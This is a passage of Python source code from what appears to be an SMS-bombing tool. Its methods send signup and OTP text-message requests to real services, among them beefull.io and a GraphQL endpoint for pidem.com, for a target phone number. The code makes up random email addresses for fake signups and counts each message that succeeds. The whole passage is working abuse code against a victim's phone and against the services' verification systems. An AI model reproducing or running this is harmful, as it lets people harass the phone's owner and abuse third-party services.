            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> daryn.online")

    def Beefull(self):
        try:
            from random import choices
            import string
            random_email = ''.join(choices(string.ascii_lowercase, k=10)) + "@gmail.com"
            
            url1 = "https://app.beefull.io/api/inavitas-access-management/signup"
            data1 = {"email": random_email, "firstName": "Memati", "phoneNumber": self.phone, "phoneCode": "90", "tenant": "beefull"}
            requests.post(url1, json=data1, timeout=4)
            
            url2 = "https://app.beefull.io/api/inavitas-access-management/sms-login"
            data2 = {"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url2, json=data2, timeout=4)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> beefull.io")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> beefull.io")

    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net/graphql/"
            data = {
                "query": "mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }",
                "variables": {"phone": self.phone}
            }
            headers = {"Content-Type": "application/json"}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Success! {self.phone} --> pidem.com")
                self.count += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Failed! {self.phone} --> pidem.com")